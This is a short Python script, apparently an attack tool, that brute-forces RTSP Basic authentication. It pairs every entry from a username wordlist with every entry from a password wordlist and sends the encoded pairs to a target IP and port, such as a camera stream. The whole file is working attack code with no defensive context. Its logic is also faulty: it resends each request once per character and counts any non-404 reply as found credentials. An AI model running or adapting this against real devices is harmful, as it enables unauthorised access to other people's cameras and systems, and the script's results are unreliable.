#!/usr/local/bin/python3
import socket
import sys
import itertools
import base64
import argparse
import time

parser = argparse.ArgumentParser(add_help=True)
parser.add_argument('-i', '--ip', help='Specify the target IP address [STRING]')
parser.add_argument('-p', '--port', help='Specify the port [STRING]')
parser.add_argument('-u', '--usernames', help='Specify the wordlist of usernames (colon separated)[FILE]')
parser.add_argument('-P', '--passwords', help='Specify the wordlist of passwords (colon separated)[FILE]')
args = parser.parse_args()

usernamesnpasswords = args.usernames, args.passwords


def b64Passwords(): 
    lists = []
    for u in usernamesnpasswords:
        words = []
        with open(u) as fp:
            for line in fp:
                words.append(line.rstrip())
        lists.append(words)

    for element in itertools.product(*lists):
        passw = ":".join(element)
        passwToBytes = passw.encode('ascii')
        passwToB64 = base64.b64encode(passwToBytes)
        passwF = passwToB64.decode('ascii')

        def request():
            for line in passwF:
                req = "DESCRIBE rtsp://"+args.ip+":"+args.port+" RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic "+str(passwF)+"\r\n\r\n"
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((args.ip, int(args.port)))
                encodereq = req.encode('ascii')
                s.sendall(encodereq)
                data = s.recv(1024)
                response = data.decode('ascii')
                passwFDecoded = base64.b64decode(passwF.encode('ascii')).decode('ascii')
                #print("Found credentials!\n"+"Request:\n"+req+"\n"+"Response: \n"+response+"\n"+"Base64 encoded password: "+passwF+"\nPassword: "+str(passwFDecoded)+"\r\n")
                if "404 Not Found" in response:
                    None
                else:
                    print("Found credentials!\n"+"Request:\n"+req+"\n"+"Response: \n"+response+"\n"+"Base64 encoded password: "+passwF+"\nPassword: "+str(passwFDecoded)+"\r\n")
        request()

b64Passwords()
